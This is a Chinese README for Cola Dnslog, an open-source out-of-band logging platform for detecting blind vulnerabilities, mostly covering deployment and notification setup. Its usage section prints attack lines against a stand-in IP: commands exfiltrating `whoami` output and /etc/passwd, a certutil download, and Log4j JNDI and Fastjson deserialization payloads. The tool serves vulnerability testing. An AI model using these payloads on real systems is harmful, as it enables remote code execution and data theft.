## Cola-Dnslog <https://github.com/AbelChe/cola_dnslog>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Python-blue)
![Author](https://img.shields.io/badge/Author-AbelChe-orange)
![GitHub stars](https://img.shields.io/github/stars/AbelChe/cola_dnslog.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V0.0.1-red)
![Time](https://img.shields.io/badge/Join-20220829-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

Cola Dnslog 是一款更加强大的dnslog平台（无回显漏洞探测辅助平台），

- 完全开源
- 支持dns http ldap rmi等协议
- 提供API调用方式便于与其他工具结合
- 支持钉钉机器人、Bark等提醒
- 支持docker一键部署


------

涉及到技术、框架：

`dns` `http` `ldap` `rmi` `webui` `vue-element-admin` `fastapi` `sqlite`

可帮助检测漏洞：

`log4j2` `fastjson` `ruoyi` `Spring` `RCE` `Blind SQL` `Bland XXE`

特色：

`Dingtalk Robot` `Bark` `API` `ldaplog` `rmilog` `Docker`

## 🥯 使用方法

> 假设你购买的域名为`example.com`
>
> 你的vps ip为`1.1.1.1`

### 域名

请自行购买域名，并将域名的解析服务器托管至部署cola_dnslog的服务器

以godaddy为例

1. 配置域名解析处右上角三个点，点击Host Names

![image-20220717175903352](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220717175903352.png)

2. 修改或新增主机名如下图所示，ip地址填写你的vps地址即可

![image-20220717180002176](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220717180002176.png)

3. 回到dns管理，将域名服务器修改为`ns1.example.com`和`ns2.example.com`

![image-20220717180242944](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220717180242944.png)

### 安装部署

> 因为一些国内网络众所周知的原因，大多数同学使用国内VPS都会卡在前端npm构建的时候，目前暂未找到更好的解决方案，建议使用国外或者网络畅通的VPS搭建。
>
> 欢迎大家提issues!

#### Docker（推荐）

##### 一键启动（推荐）

1. 下载源码

```sh
git clone https://github.com/Abelche/cola_dnslog.git
cd cola_dnslog
```

2. 修改docker-compose.yml中environment变量

```yml
...
  server:
    ...
    environment:
      DNS_DOMAIN: example.com # 自己的域名
      NS1_DOMAIN: ns1.example.com # ns1绑定
      NS2_DOMAIN: ns2.example.com # ns2绑定
      SERVER_IP: 1.1.1.1 # vps ip
      HTTP_PORT: 80 # httplog服务端口
      HTTP_RESPONSE_SERVER_VERSION: nginx # httplog返回头的服务端信息Server: nginx
      LDAP_PORT: 1389 # ldaplog服务端口
      RMI_PORT: 1099 # rmilog服务端口
    ...
  front:
  	...
    environment:
      API_BASE_URL: 'http://1.1.1.1:28001' # http://vpsip:28001 / http://example.com:28001
    ...

```

3. 启动

```sh
docker-compose up -d
```

4. 启动之后查看docker日志或者查看info.txt获取账号信息

> server端程序运行会在程序根目录创建一个info.txt用于记录初始化的账号信息

```sh
docker-compose logs
docker exec -it <container_id> cat /coladnslog/info.txt
```

![image-20220812005813825](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220812005813825.png)

> 如果需要自定义端口，请修改`docker-compose.yml`的端口映射`ports`即可



##### 前后端分离部署

服务端：

```sh
git clone https://github.com/Abelche/cola_dnslog.git
cd cola_dnslog

docker build -t coladnslog_server -f Dockerfile_server .
docker run -itd \
-e DNS_DOMAIN=example.com \
-e NS1_DOMAIN=ns1.example.com \
-e NS2_DOMAIN=ns2.example.com \
-e SERVER_IP=1.1.1.1 \
-e HTTP_PORT=80 \
-e HTTP_RESPONSE_SERVER_VERSION=nginx \
-e LDAP_PORT=1389 \
-e RMI_PORT=1099 \
--net=host \
--name ColaDnslog_server coladnslog_server
```

客户端：

```sh
git clone https://github.com/Abelche/cola_dnslog.git
cd cola_dnslog

sudo docker build --build-arg VERSION=v1.3.2 -t coladnslog_front -f Dockerfile_front .
sudo docker run -itd \
-p 18080:80 \
-e "API_BASE_URL=http://1.2.3.4:28001" \
--name ColaDnslog_front coladnslog_front
```



#### 源码安装

共分四步

##### **第一步 下载源码**

下载源码

```sh
git clone https://github.com/Abelche/cola_dnslog.git
```

> 我习惯于将服务用`tmux`放到后台运行

##### **第二步 启动webserver**

安装python（python>=3.7）依赖

注意，需要用python3.7及以上版本，否则会有兼容性问题，多python推荐使用conda

```sh
cd cola_dnslog
pip install -r requirements.txt
```

修改根目录下的`config.yaml`

主要需要修改`DNS_DOMAIN` `NS1_DOMAIN` `NS2_DOMAIN` `SERVER_IP`

可选: 修改`HTTP_RESPONSE_SERVER_VERSION`伪造http返回中Server字段

```yaml
global:
  DB_FILENAME: sqlite.db

logserver:
  DNS_DOMAIN: example.com
  NS1_DOMAIN: ns1.example.com
  NS2_DOMAIN: ns2.example.com
  SERVER_IP: 1.1.1.1
  DNS_PORT: 53
  HTTP_HOST: 0.0.0.0
  HTTP_PORT: 80
  HTTP_RESPONSE_SERVER_VERSION: nginx
  LDAP_HOST: 0.0.0.0
  LDAP_PORT: 1389
  RMI_HOST: 0.0.0.0
  RMI_PORT: 1099

webserver:
  HOST: 0.0.0.0
  PORT: 28001
  PASSWORD_SALT: 随便一长串字符串，如：cuau89j2iifdas8
```

启动webserber端和logserver端，注意这里一定要先启动webserver端（因为要先通过webserver端初始化数据库，初始化之后会在终端输出账号、密码、token、logid等信息。

```sh
chmod +x start_webserver
./start_webserver
```

![image-20220730035846090](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220730035846090.png)


##### **第三步 启动logserver**(需要root权限)

```sh
chmod +x start_logserver
sudo ./start_logserver
```

![image-20220730160132103](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220730160132103.png)


##### **第四步 启动前端**

现在来到前端（不一定要和webserver放在一起，你甚至可以通过electron打包成本地客户端），先修改配置文件`.env.production`

```sh
cd src/front
vim .env.production
```

```ini
# just a flag
ENV = 'production'

# base api
VUE_APP_BASE_API = 'http://1.1.1.1:28001'

TARGET_API = 'http://1.1.1.1:28001'
```

然后npm安装依赖、打包、启动http服务（这里可以随意选择http服务器，为了方便我直接用python启动）

```sh
cd src/front
npm install
npm run build:prod

cd dist
python3 -m http.server 18001
```

至此，三端（webserver端、logserver端、webui前端）已经全部开启！

这时，访问http://1.1.1.1:18001应该可以看到登录页面！

玩得开心！

### 钉钉机器人

在钉钉群新建机器人，安全设置：添加自定义关键词`coladnslog`

![image-20220731231424000](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220731231424000.png)

并获取到webhook的token，注意，只需要填写token即可

![image-20220731231912885](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220731231912885.png)

进入webui，修改Dingtalk Robot Token为上文获取的token，点击Update保存即可

![image-20220802020311279](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220802020311279.png)

效果如下：

<img src="https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220731231301577.png" alt="image-20220731231301577" style="zoom:33%;" />

### Bark

[Finb/Bark: Bark is an iOS App which allows you to push custom notifications to your iPhone (github.com)](https://github.com/Finb/Bark)

[Finb/bark-server: Backend of Bark (github.com)](https://github.com/Finb/bark-server)

同上 进入webui，开启Bark开关，然后修改bark url，点击Update保存

![image-20220802015907678](https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220802015907678.png)

效果如下：

<img src="https://github.com/AbelChe/cola_dnslog/raw/main/readme_resource/image-20220802015642879.png" alt="image-20220802015642879" style="zoom: 25%;" />

### 如何使用

上文提到，假定我的域名和ip是`example.com`和`1.1.1.1`，并且我们账户的logid为`qrq`

#### DNS

```sh
nsloopup `whoami`.qrq.example.com
ping `whoami`.qrq.example.com
```

#### HTTP

```sh
curl 1.1.1.1/qrq/some/info
curl -d @/etc/passwd 1.1.1.1/qrq/postdata
certutil -urlcache -split -f http://1.1.1.1/x x
```

#### LDAP

log4j2 fastjson等可以使用此方法

注意这里必须要令最后路径的最后作为logid，如：`ldapqrq` `xxxxqrq` `qrq` `xxx/qrq`

```
${jndi:ldap://1.1.1.1:1389/ldapqrq}
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://1.1.1.1:1389/ldapqrq", "autoCommit":true}
```

#### RMI

同上，log4j2 fastjson等

```
${jndi:rmi://1.1.1.1:1099/rmiqrq}
{ "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://1.1.1.1:1099/rmiqrq", "autoCommit":true } }
```

## 👀 概览

### 登录

![image-20220730151326711](readme_resource/image-20220730151326711.png)



### 首页

![image-20220731143149729](readme_resource/image-20220731143149729.png)



### Dnslog

![image-20230204200108337](readme_resource/image-20230204200108337.png)



### Httplog

![image-20230204200455783](readme_resource/image-20230204200455783.png)



### Ldaplog

![image-20230204201704004](readme_resource/image-20230204201704004.png)



### Rmilog

![image-20230204201750497](readme_resource/image-20230204201750497.png)



### 账号信息

![image-20220801003540673](readme_resource/image-20220801003540673.png)



### 钉钉机器人

<img src="readme_resource/image-20220731231301577.png" alt="image-20220731231301577" style="zoom: 25%;" />



### Bark

<img src="readme_resource/image-20220802015642879.png" alt="image-20220802015642879" style="zoom: 25%;" />

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
